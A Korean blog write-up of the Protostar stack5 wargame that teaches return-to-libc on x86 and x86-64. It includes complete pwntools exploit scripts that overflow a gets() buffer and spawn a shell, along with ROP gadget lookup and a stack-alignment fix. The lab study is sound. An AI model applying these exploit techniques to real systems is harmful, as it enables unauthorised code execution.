---
layout: post
title:  "Protostar-stack5.c x86 & x86-64"
summary: RTL 실습 및 32비트/64비트 프로그램 RTL exploit의 차이
author: TouBVa
date: '2022-11-13 20:31:23 +09'
category: System Hacking Basic, Taught By Myself
thumbnail: /assets/img/posts/protostar5/Untitled.jpeg
keywords: System Hacking, RTL, x86, x86-64
usemathjax: true
permalink: /blog/protostar-stack5-x86-x64/
---

학교 수업에서 풀이한 문제 중 하나로, x86에서의 RTL과 x86-64에서의 RTL을 모두 실습하기에 좋은 문제인 것 같아 블로그에 기록해본다.

사실 이 문제는 BOF로 쉘코드를 넣으라고 만들어준 문제이긴 하지만, 1) 마음대로 RTL을 하기에도 괜찮아 보이고 2) 32bit로 컴파일 시 메인 함수의 에필로그가 달라지는 문제가 있기에 해결해 보고 싶어 선택했다.

---

---

# 0. X86에서의 RTL과 X64에서의 RTL

## 0.1. RTL이란

> RTL 이란 Return 2 Library(or Libc)의 약자로, 프로그램 실행 시 해당 언어로 짜인 코드에는 필수적으로 포함되는 라이브러리가(gcc 컴파일러의 경우 libc) 함께 메모리에 로딩되는 점을 악용하여 프로세스 플로우를 해당 라이브러리 내의 원하는 함수로 변경시켜 시스템이 공격자가 원하는 행위를 하도록 조작하는 공격 기법을 의미한다.
> 
- 윈도우의 경우 RTL은 DEP가 설정되어 있어 스택에서 코드 실행이 불가능할 경우 사용된다.
- DEP는 윈도우의 스택 내 코드 실행 방지를 위한 보안 정책인데, Linux Stack Canary의 윈도우 버전인 Stack Cookie와는 다르다. 오히려 Linux의 NX-bit와 좀 더 겹친다고 보는 게 맞다.
    - Windows XP SP2와 Windows 2003 SP1에서부터 추가된 기능으로, 웜바이러스의 BOF 익스플로잇 과정(data 영역인 Thread stack을 공격)을 차단하는 것이 목적이었다.
    - 가상 메모리 영역을 ‘실행 불가’ 상태로 처리하고, 여기에서 코드가 실행되고자 한다면 `STATUS_ACCESS_VIOLATION` 예외를 발생시킴으로써 프로세스를 Kill 하는 것이 기본 원리이다.
    - 위의 원리를 위해 가상메모리 페이지 옵션에 `PAGE_EXECUTE`, `PAGE_EXECUTE_READ`, `PAGE_EXECUTE_READWRITE`, `PAGE_EXECUTE_WRITECOPY` 플래그를 추가했다.
- DEP에는 소프트웨어가 제공하는 DEP와 하드웨어가 제공하는 DEP가 있다.
    - 하드웨어 DEP는 메모리를 페이지 단위에서 실행 불가능으로 처리해 CPU에게 넘기는 방식이다.
    - 소프트웨어 DEP는 데이터 페이지 부근에서의 코드 실행을 막지는 못하지만 SEH 덮어쓰기 등의 공격은 막을 수 있다.

## 0.2. 요점

1. 32bit architecture의 함수 calling convention과 64bit architecture의 함수 calling convention은 레지스터 확보 문제로 인해 달라졌다.
2. 32 bit architecture에서는 안 그래도 부족한 용량이라 연산 시 가상메모리 외의 용량 자원인 레지스터를 더 잘 써야 할 필요성이 있다. 즉, 그 귀한 레지스터를 꼴랑 함수의 파라미터를 저장하는 데 사용하지 않는다. 결과적으로 함수의 파라미터는 스택에 저장되어 전달된다.
3. 64 bit architecture에서는 이야기가 다르다. 함수의 파라미터가 레지스터 6개에 먼저 저장되고, 그래도 파라미터가 남으면 남은 파라미터를 스택에 저장하기 때문이다.
    - 64bit 구조가 되면서 메모리 주소 체계도 달라져 프로세스에 할당 가능한 가상 메모리 크기가 16EB까지 올라갔다. 그로 인해 원래 레지스터가 감당해야 했던 저장의 필요성이 사라지며 잉여 레지스터들이 생기게 되었다.
    - 컴퓨터구조를 배운 사람들이라면 레지스터 메모리가 가장 빠른 메모리임을 알 것이다. 메모리들의 가용 용량/속도의 관계를 나타낸 이미지를 첨부한다.
        
        ![Untitled](/assets/img/posts/protostar5/Untitled.jpeg)
        
    - 가장 빈번하게 읽어와야 하는 것이 함수의 파라미터이기 때문에 속도의 효율성을 위해 레지스터에 파라미터를 저장하는 것으로 함수의 calling convention을 정의하게 되었다. 그렇게 하더라도 저장 성능 오버헤드 대비 속도 이득이 훨씬 높기 때문이다.
4.  이로 인해 RTL 기법을 이용한 익스플로잇 수행 시 입력해야 할 페이로드의 형태가 달라졌다. 다음 장에서 자세히 설명할 것이므로 아래에는 페이로드의 구성만 언급한다.
    - 32bit
        
        ```c
        offset bytes + Library function address(RET) + 4 bytes(dump) + parameter address
        ```
        
    - 64bit (왜 페이로드가 이런 꼴인지 이해가 어려울 수 있지만, 아래에서 RSP의 위치 변동을 감안하며 설명하겠다)
        
        ```c
        offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
        ```
        

---

# 1. X86 기반에서 RTL 수행하기

## 1.1. 파라미터가 스택에?

C 언어의 경우 함수의 Calling Convention을 정의해 둔 것은 __cdecl이다. 관련해 좀 더 자세한 설명과 리눅스에서 cdecl 사용을 확인하는 과정은 [여기](https://toubva.github.io/blog/system-hacking-step5/#/)

만일 sum(1, 2)를 콜했다면 sum 함수의 line 1에 들어섰을 때의 스택 구조는 아래와 같을 것이다.

| Stack frame of Callee over EBP and RET |
| --- |
| EBP |
| RET |
| SFP of Caller |
| 1 |
| 2 |
| Stack frame of Caller |

파라미터는 마지막 파라미터부터 스택에 push된다는 점을 다시 한 번 주지하고자 한다. 왜냐하면 ESP는 pop될 때 낮은 주소에서 높은 주소로 이동하기 때문이다. 즉, 파라미터를 스택에 push한 것과 거꾸로의 순서를 따라 파라미터를 읽어오기 때문에 마지막 파라미터부터 push하는 것이다.

## 1.2. RTL을 위한 스택 조작

위에서 말한 Cdecl 규약에 따른다면, RTL을 하기 위해서는 어떤 식으로 스택을 조작해야 할까?

해결책은 정말 간단하고 논리적이다. RET address를 Libc에 올라가 있는 특정 함수의 주소로 조작하고, 해당 함수가 제공하는 기능을 이용하여 쉘 프로세스를 실행할 수 있도록 해당 함수의 파라미터 형식에 맞는 파라미터를 Cdecl 규약에 부합하도록 적합한 위치에 넣어두는 것이다.

위의 설명만 읽으면 직전에 말한 간단하다는 말이 무색할 만큼 복잡하기 짝이 없어 보인다. 그러니 아래 그림을 보자. BOF 취약점으로 스택을 조작할 수 있다는 전제 하에서 그린 그림이다.

| Dump bytes(Overflowed) |
| --- |
| Corrupted EBP |
| Libc function address(Corrupted RET) |
| Corrupted SFP of Caller (4 bytes) |
| 1st Param of the function |
| 2nd Param of the function |
| … |

따라서, BOF 취약점이 존재한다고 가정할 때 페이로드의 구조는 아래와 같을 수밖에 없다.

```c
offset bytes + Library function address(RET) + 4 bytes(dump) + parameter address
```

물론 다른 함수 호출 규약을 쓴다면 그건 그거대로 반영해야 할 문제일 테다.

## 1.3. 실습

어떠한 프로그램을 익스플로잇하기 위해서는 아래와 같은 과정을 거쳐야 한다.

1. 대상 프로그램 분석해 취약점 지정
2. 해당 취약점을 익스플로잇할 방법 지정
3. 익스플로잇 생성

실습에서는 위의 과정에 따라 순차적으로 익스플로잇 방식을 설명한다.

### 1.3.1. 대상 프로그램 분석해 취약점 지정

프로그램의 소스 코드를 주었기 때문에 문제의 난이도가 낮은 편이다. 아래 소스 코드를 분석하며 취약점을 찾아 보자.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
 
int main(int argc, char **argv)                                                        
{
  char buffer[64];
 
  gets(buffer);
}
```

사용자의 입력값을 받아 지역 변수에 저장하는 간단한 프로그램이다. 그런데, 사용자의 입력값을 받을 때 `gets` 함수를 사용했다는 점에서 문제가 있다. 흔히 Boundary check라고 하는 사용자 입력값 길이 확인을 하지 않는 함수이기 때문이다. 즉, 위 프로그램의 문제는 gets 함수를 사용한 것으로, 해당 함수는 사용자가 주는 대로 전부 받아 저장하기 때문에 Buffer Overflow 취약점이 존재하는 함수이기 때문에 위 프로그램 또한 BOF 취약점을 가지게 되었다.

### 1.3.2. BOF 취약점 익스플로잇할 방법 지정

이번에는 BOF와 연계한 RTL 방식으로 쉘을 딸 것이다. BOF-RTL에 사용될 페이로드가 아래와 같기 때문에, 성공시키기 위해 알아야만 하는 정보는

- 몇 바이트를 넣어야 EBP까지를 오염시킬 수 있는가
- Libc의 어떤 함수를 쓸 것인가
- 해당 함수의 메모리상 주소는 무엇인가
- Libc 내부에 해당 함수가 쉘을 실행시키도록 사용할 수 있는 파라미터가 하드코딩되어 있는가
- 그렇다면 해당 파라미터는 어디에 있는가

이다.

```c
offset bytes + Library function address(RET) + 4 bytes(dump) + parameter address
```

**1.3.2.1. offset bytes 구하기**

pwndbg를 stack5에 물려 보았다. 컴파일 옵션은 아래와 같다.(주의!! 아래 컴파일 옵션을 사용하면 안된다! `-mpreferred-stack-boundary=2` 로 해야 한다!!!! 이유는 마지막에 가서 설명하겠다)

```c
gcc -m32 -mpreferred-stack-boundary=4 -fno-stack-protector -z execstack -no-pie -fno-pic -o stack5 stack5.c
```

`disas main` 명령어로 얻은 어셈블리 덤프는 아래와 같다.

![Untitled](/assets/img/posts/protostar5/Untitled%201.jpeg)

main 함수가 파라미터를 받는 형식이라 해당 파라미터를 내부적으로 처리하기 위해 공간을 확보한다. 그러나 그것에 신경쓸 필요 없이, gets 심볼이 딸린 call 직전의 어셈블리어에 집중하다.

gets는 파라미터로 char* 버퍼의 시작 주소를 받는다. 파라미터가 하나뿐이므로 cdecl 규약에 따라 `*(main+24)`에서 스택에 push 되는 부분이 파라미터를 스택에 넣는 행위일 것이다. eax에 있는 값을 넣기 때문에 eax에 무슨 값이 들어가는지 따라가 보면, `[ebp-0x48]` 을 lea 명령어를 이용해 eax에 주는 것을 확인할 수 있다. lea 명령어를 이용했으므로 `[ebp-0x48]` 은 주소로서 취급된다. 즉, `[ebp-0x48]` 이 바로 BOF을 일으킬 시작 주소가 된다.

buffer 변수는 64byte인데 왜 0x48, 즉 64+8 byte 만 주는지 궁금할 수 있다. 이전 포스트에서도 언급한 것처럼, gcc 컴파일러가 보안 정책의 일환으로 문자 배열을 만들 때 추가적으로 공간을 더 할당해 주기 때문이다. 일반적으로 8 byte~16 byte 정도의 공간을 더 주는 것으로 알고 있다.

따라서, 0x48byte를 모두 채우면 ebp의 바로 위까지를 변조할 수 있기 때문에 우리가 주어야 할 **offset byte는 0x48+0x4 = 0x4c byte**가 될 것이다. 

**1.3.2.2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기**

먼저 쉘을 따는 데 사용할 수 있는 libc 내부 함수들이 많지만, 이번에는 system()함수를 사용해 보려 한다. system() 함수의 사용 규약은 아래와 같다.

```c
#include<stdlib.h>
int system(const char *command);
```

[Document](https://man7.org/linux/man-pages/man3/system.3.html)에 따르면, system() 함수는 fork(2) 시스템 콜을 이용해 execl(3) 함수를 실행하는 child process를 만들어 아래와 같은 커맨드를 실행한다.

```c
execl("/bin/sh", "sh", "-c", command, (char *)NULL);
```

즉 command 변수에 들어간 문자열에 해당되는 쉘 명령어가 실행된다. 나는 쉘을 실행하고 싶기 때문에 /bin/sh를 넣어야 한다.

그렇다면 system() 함수의 주소와 파라미터로 들어갈 “/bin/sh” 문자열이 하드코딩되어 있는 주소는 어떻게 구할 수 있을까. 크게 세 가지 방식이 있다. 1) gdb를 이용하기 2) libc에서 찾기 3) pwntools 이용해 libc 뒤지기.

1. gdb 이용하기
    
    프로그램이 시작해야 라이브러리가 메모리에 로딩되기 때문에 프로그램을 돌려놓고 system의 주소를 찾아야 한다. 그러나 그냥 `r` 명령어로 프로그램을 돌려버리면 프로그램이 끝나버려서 메모리에 로딩된 라이브러리도 증발한다. 따라서 `b main` 명령어로 브레이크 포인트를 걸고 `r` 명령어를 입력한다.
    
    이후 `p system` 명령어를 입력하면 아래와 같은 결과를 볼 수 있다.
    
    ![Untitled](/assets/img/posts/protostar5/Untitled%202.jpeg)
    
    이제 ‘/bin/sh’ 문자열을 찾아야 한다. `find &system,+999999999,"/bin/sh"` 명령어를 이용하면 쉽게 찾을 수 있다. system 함수의 시작 주소부터 명시된 숫자만큼 올려가며 주어진 문자열을 찾으라는 명령어다.
    
    ![Untitled](/assets/img/posts/protostar5/Untitled%203.jpeg)
    
2. libc에서 찾기
    
    타겟 프로그램이 사용하는 라이브러리와 그것이 적재되는 주소를 알아낼 수 있는 `ldd {program_name}` 명령어를 사용한다.
    
    ![Untitled](/assets/img/posts/protostar5/Untitled%204.jpeg)
    
    libc 라이브러리의 디렉토리상의 위치와 실질 메모리상 적재 위치를 알 수 있다.
    
    그럼 objdump를 이용해 libc.so.6 상에 위치하는 system 함수의 오프셋을 알아내면 된다.
    
    ![Untitled](/assets/img/posts/protostar5/Untitled%205.jpeg)
    
    `0x3d3d0`이 system 함수의 오프셋인 것처럼 보인다. 실제로 libc.so.6의 시작 주소인 `0xf7dde000` 에 오프셋인 `0x3d3d0`을 더하면 `0xf7e1b3d0`으로 system 함수의 시작 주소가 맞다.
    
    그런데 궁금증이 생긴다. 저기 libc_system 뒤에 붙어 있는 `@@GLIBC_PRIVATE`가 대체 뭐지? 궁금해서 알아보니 `@@`는 default 버전임을 의미하고, `GLIBC_PRIVATE` 심볼은 라이브러리 링커 내에서만 사용되는 내부 규약으로 링커가 공유 라이브러리들끼리 서로를 refer 할 때 쓰는 인터페이스의 wrapper를 의미한다는 점을 알게 되었다.
    
    사실 계산을 잘못 해서 objdump로 알아낸 system 함수의 적재 주소와 gdb로 알아낸 주소가 다른 줄 알고 원인을 알아내고 싶어 삽질을 엄청나게 하는 바람에 리눅스의 파일 링크와 링커-공유 라이브러리 간의 호출에 대해 공부하게 되었는데, 해당 내용은 맨 밑에서 자세히 설명한다.
    
3. pwntools 사용해 libc 뒤지기
    
    ```python
    from pwn import *
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    
    print('system = ',hex(libc.symbols['system']))
    print('/bin/sh = ', hex(list(libc.search(b'/bin/sh'))[0]))
    print('/bin/sh = ', hex(next(libc.search(b'/bin/sh'))))
    ```
    
    위의 코드를 이용하면 아래와 같은 결과가 나온다.
    
    ![Untitled](/assets/img/posts/protostar5/Untitled%206.jpeg)
    

### 1.3.3. 익스플로잇 생성

이제까지 알아낸 정보를 취합하면 페이로드의 구조를 아래와 같이 지정할 수 있다.

```python
0x4c dump + 0xf7e1b3d0 + 4 byte dump + 0xf7f5c1db
```

하지만 여기에 함정이 있다. 초반에 설명했던 컴파일 옵션 때문이다. 컴파일 시 나는 `mpreferred-stack-boundary=4` 로 줬다. 원래는 64bit로 컴파일 하려다가 급하게 32bit로 방향을 바꾸는 바람에 값을 2로 바꾸는 걸 깜빡했다!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

`mpreferred-stack-boundary` 는 스택을 정리해 주고, 주어진 값을 n이라 할 때 2^n의 배수로 스택 프레임의 바닥이 지정되도록 align해주는 옵션이다. 32 bit 컴파일 시에는 값을 2로 줘야 4의 배수로 스택 프레임의 바닥이 정리되기 때문에 편하고, 64bit 컴파일 시에는 값을 4로 줘야 16의 배수로 스택 프레임의 바닥이 오면서 스택이 정리되기 때문에 편한데… 나는 32bit로 컴파일하면서 값을 4로 줬다. 그래서 함수의 에필로그가 변하는 바람에 자꾸만 페이로드가 먹히지 않았다.

32 bit로 컴파일하면서 `mpreferred-stack-boundary` 를 제대로 설정하지 않으면 아래와 같은 에필로그가 나온다.

![Untitled](/assets/img/posts/protostar5/Untitled%207.jpeg)

아무래도 해당 옵션의 디폴트 값이 4라서 16의 배수로 스택 프레임의 꼭대기가 끝나는 상황인지라, 필요한 것보다 더 할당된 스택을 정리하기 위해 `lea esp,[ecx-0x4]` 인스트럭션이 추가되어 있다. 

옵션을 제대로 주면 해당 인스트럭션이 없는 클래식한 에필로그를 볼 수 있다.

추가로 말하자면, 위와 같은 상황일 때 함수의 프롤로그도 새로운 형식이 되어 나타난다. 애초에 16의 배수로 스택 시작점을 align할 필요가 없는 32bit 프로그램이다 보니 억지로 ebp 주소를 16의 배수로 맞추기 위해 아래와 같은 프롤로그가 보인다.

![Untitled](/assets/img/posts/protostar5/Untitled%208.jpeg)

`0xfffffff0` 과 and 연산을 함으로써 무조건 16의 배수로 만든 esp를 ebp에 넣어서 스택의 바닥을 지정하는 부분이 보인다.

다시 핵심으로 돌아와, 대상 파일을 컴파일해 앞의 과정을 다시 밟은 이후 페이로드를 지정한다면 아래처럼 쉘을 딸 수 있다.

![Untitled](/assets/img/posts/protostar5/Untitled%209.jpeg)

물론 스크립트를 작성해 익스플로잇을 수행할 수도 있다.

```python
# stack5_32_exploit.py
from pwn import *

p = process('./stack5_32')

system_add=p32(0xf7e1b3d0)
ret_corrupt=p32(0x41414141)
str_add=p32(0xf7f5c1db)

payload = b'A'*0x44+system_add+ret_corrupt+str_add

p.sendline(payload)

p.interactive()
```

---

# 2. X86-64 기반에서 RTL 수행하기

앞서 익스플로잇의 세 단계 중 두 단계를 끝냈기 때문에 이 절에서는 마지막 단계에 대해서만 서술한다.

1. 대상 프로그램 분석해 취약점 지정
2. 해당 취약점을 익스플로잇할 방법 지정
3. 익스플로잇 생성

## 2.1. 페이로드가 왜 이 모양이야?

64비트로 컴파일된 프로그램에 RTL을 하려면 아래와 같은 페이로드를 넣어야 한다.

```
offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
```

대체 왜 그런 거지 싶다. 이유는 정말 간단한데, 앞서 설명했던 Cdecl 규정, 함수의 Calling Convention 때문이다. x86-64에서는 함수의 첫 파라미터 6개가 rdi, rsi, rdx, rcx, r8, r9에 순서대로 들어가고, 그러고도 파라미터가 남는다면 뒤에서부터 스택에 들어간다는 것을 꼭 기억하자. 

우리는 system() 함수에 “/bin/sh” 문자열의 주소를 첫 번째이자 마지막 인자로 전달하는 것이 목적이다. 즉, “/bin/sh”의 주소를 rdi에 저장해야만 한다. 그렇게 하기 위해

1. 스택 프레임의 ret add에 메모리에 적재된 수많은 인스트럭션 중 어딘가에 있을 `pop rdi;ret` 의 주소를 넣고
2. 해당 인스트럭션 중 첫 번째로 `pop rdi` 가 실행된다면 rsp가 위치한 곳, 즉 현재 ret address의 바로 아래 위치가 rdi에 담기고 rsp가 한 주소 아래로 내려가게 될 것을 이용한다.
3. 직후 `ret` 가 실행될 것, 즉 현재 위치한 rsp가 가리키는 스택 위치에 담긴 주소가 rip에 담겨 이다음에 실행될 것을 이용한다.

이러한 흐름을 성공시키기 위해 페이로드는 위와 같은 형태가 된다.

이 시점에서 알아내야 하는 정보는 4개로 좁혀진다.

1. Offset byte의 크기
2. Gadget의 주소
3. “/bin/sh”의 주소
4. system의 주소

## 2.2. 익스플로잇 생성

### 2.2.1. Offset Byte의 크기 알기

`disas main` 명령어를 이용한다.

![Untitled](/assets/img/posts/protostar5/Untitled%2010.jpeg)

gets에 들어가는 첫 번째 인자를 저장하는 rdi에 들어가는 값을 확인해 보면 `rbp-0x40` 임을 알 수 있다. 즉, rbp까지를 오염시키기 위해 0x48 bytes가 필요함을 알 수 있다.

`offset byte = 0x48 bytes`

### 2.2.2. Gadget의 주소 알기

목표하는 gadget은 `pop rdi;ret;` 이다. 이를 찾기 위해 pwntools를 이용한다.

![Untitled](/assets/img/posts/protostar5/Untitled%2011.jpeg)

타겟 프로그램은 `/lib/x86_64-linux-gnu/libc.so.6` 을 사용하고 있음을 확인했다.

따라서 가젯을 찾아오는 스크립트는 아래와 같다.

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget=ROP(libc)

print('gadget(ret rdi;ret;) = ', hex((gadget.find_gadget(['pop rdi', 'ret'])[0])))
print('system=', hex(libc.symbols['system']))
print('/bin/sh=', hex(list(libc.search(b'/bin/sh'))[0]))
```

스크립트 실행 결과는 아래와 같았다.

![Untitled](/assets/img/posts/protostar5/Untitled%2012.jpeg)

앞서 알아둔 라이브러리 시작 주소가 `0x7ffff7a0364f` 이고, 가젯의 오프셋이 `0x2164f` 이므로 둘을 더한 결과값인 `0x7ffff7a0364f` 에 정말로 가젯이 적재되어 있는지 gdb로 확인해 보자.

![Untitled](/assets/img/posts/protostar5/Untitled%2013.jpeg)

적재되어 있다.

`Gadget address = 0x7ffff7a0364f` 

### 2.2.3. “/bin/sh”과 system의 주소 알기

위에서 가젯의 위치를 알아내기 위한 스크립트에서 이미 알아냈기 때문에 값만 쓰고 생략한다.

`System offset = 0x4f420`

`/bin/sh offset = 0x1b3d88` 

일일이 더하고 싶지 않기 때문에 계산은 스크립트에게 맡겨야겠다.

### 2.2.4. 익스플로잇 생성

> 🤩: 좋아 이제 스크립트만 실행하면 끝이다!
> 
> 
> 🤨: 아니 그런데 왜 안돼
> 
> 🤯: 아 SEGFAULT다
> 
> 💩: 하….
> 

이럴 땐 당황하지 말고 침착하게 트러블슈팅을 시작하면 된다. 물론 나는 너무 당황해서 찔끔 울긴 했는데

pwntools에서 제공하는 기능 중, gdb에 현재 프로세스를 attach하게 해주는 기능이 있다. 현재 프로세스의 pid를 가져와 그것을 gdb에게 주는 식의 매커니즘인데, 이를 사용하는 방법은 아래와 같다.

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget=ROP(libc)

libc_base=0x7ffff79e2000

gadget_offset = int((gadget.find_gadget(['pop rdi', 'ret'])[0]))
system_offset = int(libc.symbols['system'])
string_offset = int(list(libc.search(b'/bin/sh'))[0])

gadget_address=libc_base+gadget_offset
system_address=libc_base+system_offset
string_address=libc_base+string_offset

p = process('./stack5_64')

payload = b'A'*0x48+p64(gadget_address)+p64(string_address)+p64(system_address)

gdb.attach(p)

raw_input("1")

p.sendline(payload)

p.interactive()
```

`gdb.attach(process({program_name}))`를 이용해 스크립트에서 돌리는 프로그램에 gdb를 붙이도록 했고, gdb를 붙인 프로그램이 미처 반응하기도 전에 실행되고 끝나버리는 상황을 방지하기 위해 `raw_input(”1”)` 코드를 삽입했다. 위 스크립트를 실행하면 gdb 창이 뜨는데, 그때 브레이크 포인트를 설정하고 원래 터미널 창에 1을 입력한 후 gdb 창에서 `c` 를 누르면 디버깅을 할 수 있다.

브레이크 포인트 설정 시 콜스택을 잘 확인해야 한다. 이미 실행되었던 인스트럭션에 브레이크 포인트를 설정하는 바보짓은 절대 엄금이다! *그렇다. 내가 바로 그 바보다! 안녕하세요 반갑습니다 바보 1입니다*

`system` 함수는 `do_system` 함수를 콜하고, `do_system` 함수는 거의 끄트머리에서 `execve` 함수를 콜하면서 인자를 넘겨주는 형식이다. 즉, `do_system` 함수 내부로 들어갔을 때 `execve` 를 콜하기도 전에 SEGFAULT가 나는 이유를 알아내는 것이 현재 디버깅의 목적이다.

![Untitled](/assets/img/posts/protostar5/Untitled%2014.jpeg)

`c`를 누르고 보면 위 부분에서 rip가 freezed 된 것이 보인다.

대관절 `movaps` 가 뭐냐 싶다.  검색해본 결과, `movaps` 는 64 비트 프로그램의 Calling convention을 지켜주고자 도입된 인스트럭션으로, 스택 주소가 16의 배수로 딱딱 떨어지게 데이터가 담겨있는 게 아니면 앞으로의 함수 콜에 심각한 문제가 생길 것을 우려해 프로그램을 멈추게 만드는 인스트럭션이다.

지금 문제가 된 인스트럭션을 보면, `movaps xmmword ptr [rsp + 0x40], xmm0` 이라고 되어 있는데, xmm0라는 레지스터는 SIMD 연산에 사용되는 전용 레지스터인데, SIMD(Single Instruction Multi Data)라는 이름에서도 알 수 있듯 한 레지스터에 4개의 데이터를 한꺼번에 집어넣을 수 있는 레지스터이다. 지금은 중요하지 않으니 그냥 넘어가자. 중요한 것은 `xmmword ptr [rsp + 0x40]` 이다. 현재 보이는 컨텍스트의 아랫부분에 표현된 스택을 확인하면, rsp의 위치는 끝이 8로 끝나기 때문에 8의 배수이지만 16의 배수는 아니다. 여기에 `0x40` 을 더한 스택의 위치는 역시 8의 배수이지만 16의 배수는 아니다. 즉, `movaps` 인스트럭션의 종료 조건에 딱 들어맞는 상황이다.

이런 상황은 사실 ROP 공격을 하지 않았다면 발생하지 않았을 상황이다. 그리고 ROP 공격을 할 때 가장 자주 맞닥뜨리는 pitfall 이기도 하다. 조금 더 자세한 설명은 [이쪽을 참고하자.](https://ropemporium.com/guide.html)

말이 거창했는데, 해결법은 간단하다. 내가 rsp 주소를 마음대로 바꾸다가 rsp 주소가 16의 배수가 아닌 8의 배수가 되도록 만들어 놨으니, rsp가 한 칸(8 bytes)을 더 내려가든 올라가든 하도록 하면 된다. 이 때 딱히 페이로드 구조를 크게 바꾸지 않고 rsp가 한 칸(8 bytes) 더 이동하도록 하는 제일 쉬운 방법은 ret를 처음에 하나 끼워넣는 것이다.

즉 페이로드는 아래와 같은 형태가 된다.

```
offset bytes + Gadget1 address(ret;) + Gadget2 address(pop rdi;ret;) + parameter address + Library function address
```

ret add에 있는 인스트럭션의 주소로 rip를 옮겨놓으니 또 `ret`을 하래서 rsp가 가리키는 주소에 있는 주소값을 rip에 넣어주니 이번엔 `pop rdi;ret;`가 기다리고 있는 형식이다.

위와 같은 페이로드를 보내기 위해 스크립트를 아래와 같이 변형했다.

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget=ROP(libc)

libc_base=0x7ffff79e2000

extra_ret_offset = int((gadget.find_gadget(['ret'])[0]))
gadget_offset = int((gadget.find_gadget(['pop rdi', 'ret'])[0]))
system_offset = int(libc.symbols['system'])
string_offset = int(list(libc.search(b'/bin/sh'))[0])

extra_ret_address=libc_base+extra_ret_offset
gadget_address=libc_base+gadget_offset
system_address=libc_base+system_offset
string_address=libc_base+string_offset

p = process('./stack5_64')

payload = b'A'*0x48+p64(extra_ret_address)+p64(gadget_address)+p64(string_address)+p64(system_address)

# gdb.attach(p)

# raw_input("1")

p.sendline(payload)

p.interactive()
```

스크립트 실행 결과 아래와 같이 쉘을 딸 수 있었다.

![Untitled](/assets/img/posts/protostar5/Untitled%2015.jpeg)

---

# 3. 삽질이 남긴 지식

## 3.1. 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정

먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.

![Untitled](/assets/img/posts/protostar5/Untitled%2016.jpeg)

`[libc-2.27.so](http://libc-2.27.so)` 파일과 `[ld-2.27.so](http://ld-2.27.so)` 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.

![Untitled](/assets/img/posts/protostar5/Untitled%204.jpeg)

아니 `libc.so.6` 이랑 `ld-linux.so.2` 썼다며? 그런데 왜 정작 사용된 건 다른 거야??

### 3.1.1. File Link

이에 관해서는 리눅스의 soft link와 linker의 동적 라이브러리 호출에 대해 안다면 답을 알 수 있다. 

먼저 리눅스에는 파일 링크라는 시스템이 있는데, 이는 윈도우의 바로가기와 상당히 비슷하다. 이 파일 링크는 첫째, 하드 링크(Hard Link)와 둘째, 소프트 링크(Soft Link or Symbolic Link) 두 개 종류로 나뉘는데, 둘의 차이점은 원본 파일과 동일한 inode를 가지느냐, 다른 inode를 가지느냐이다. inode에 관해서는 os를 공부했다면 알 수 있는지라 자세히 설명하진 않겠지만 파일 시스템 상에서 파일을 호출할 때 참고하는 inode table상의 index 번호 정도로 설명을 퉁치고 넘어가려 한다.

- 하드 링크는 `ln {original file} {linked file}` 명령어로 생성한다. 이 경우 `ls -li` 명령어로 inode를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 동일함을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌더라도 링크된 파일을 실행하면 원본 파일이 실행된다.
- 소프트 링크는 `ln -s {original file} {linked file}` 명령어로 생성한다. 이 경우 `ls -li` 명령어로 inode와 파일 정보를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 다르며, `->` 기호로 링크가 표시되어 있음을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌면 링크된 파일을 실행했을 때 링크가 원본 파일을 찾지 못한다. 아래 사진은 소프트 링크를 확인했을 때의 사진이다.
    
    ![Untitled](/assets/img/posts/protostar5/Untitled%2017.jpeg)
    
    가장 첫 번째에 보이는 `[libc-2.27.so](http://libc-2.27.so)` 파일의 inode num은 `6816882` 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 `libc.so.6` 파일의 inode num은 `6816904` 로 서로 다르다는 것을 확인할 수 있다.
    

좋아, 그렇다면 파일 실행 시 **공유 라이브러리**로는 `libc.so.6` 을 썼기 때문에 소프트 링크의 오리지널 파일인 `[libc-2.27.so](http://libc-2.27.so)` 가 사용됐고 **Dynamic Loader**로는 `ld-linux.so.2` 를 썼기 때문에 링크가 걸린 `[ld-2.27.so](http://ld-2.27.so)` 가 사용됐다고 치자. (아래 사진 참고)

![Untitled](/assets/img/posts/protostar5/Untitled%2018.jpeg)

그런데 또 궁금한 게 생긴다. so 파일이 뭔지는 알겠는데… `so.2`와 `so.6`은 대체 무슨 뜻이야?

### 3.1.2. GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위

결론적으로 말하자면 `.so` 파일은 해당 라이브러리의 대표 호칭 격인 `Linker name`이고,  `.so.2` 등 뒤에 숫자가 붙은 파일은 해당 라이브러리의 하위 격인 `soname` 이다. 

라이브러리에는 정적 라이브러리(*.a)와 동적(공유) 라이브러리(*.so) 두 종류가 존재한다는 건 아마 이 블로그쯤 온 사람들이라면 알음알음 알 것이므로 생략한다. 윈도우에서는 동적 라이브러리로 *.dll 파일을 쓴다는 건… 쓰고 싶으니까 쓸거다.

- 컴파일 시의 행위:
    - 프로그램 컴파일 시 트리거된 링커는 컴파일러와 프로그램을 참고해 필요한 `Linker name`을 가진 라이브러리를 찾아내고, 해당 라이브러리의 `soname`을 읽어온다.
- 파일 실행 시의 행위:
    - 이후 컴파일된 프로그램을 실행할 때 `Dynamic Loader` 가 실행되고 이것이 Dynamic Link 된 공유 라이브러리를 `soname` 을 이용해 각종 변수로부터 위치를 찾아낸 다음 메모리에 띄워 준다. 그렇다. `Dynamic Loader` 가 RTL 기법의 주범이었던 것이다…

